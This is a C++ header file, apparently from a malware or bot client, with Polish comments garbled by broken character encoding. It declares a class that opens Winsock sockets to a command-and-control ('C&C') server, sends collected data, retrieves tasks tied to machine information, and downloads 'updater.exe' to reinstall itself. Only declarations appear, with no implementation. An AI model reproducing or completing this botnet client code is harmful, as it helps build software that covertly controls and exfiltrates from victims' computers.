#include "stdafx.h"

class MachineInfo;

class NewConnection //Nowe po��czenie klienckie
{
private:
	bool DownloadUpdater(); //Pobiera updater.exe

	

public:
	SOCKET _socket = NULL; // Przyjmuje warto�� po wywo�aniu create_socket()

	bool run_winsock(); // Uruchom winsock 2.0
	
	SOCKET create_socket(); // Po��cz si� z C&C, zwraca uchwyt gniazda
	
	bool send_data(std::string http_query); // Wysy�a dane do serwera
	
	std::string check_command(MachineInfo &info); // Zwraca tre�� zadania z serwera

	void close_socket(); //Niszczy gniazdo

	~NewConnection(); //Desktruktor gniazda

	void UpdateClient(); //Pobiera now� wersj� klienta i przeprowadza jej instalacj�
};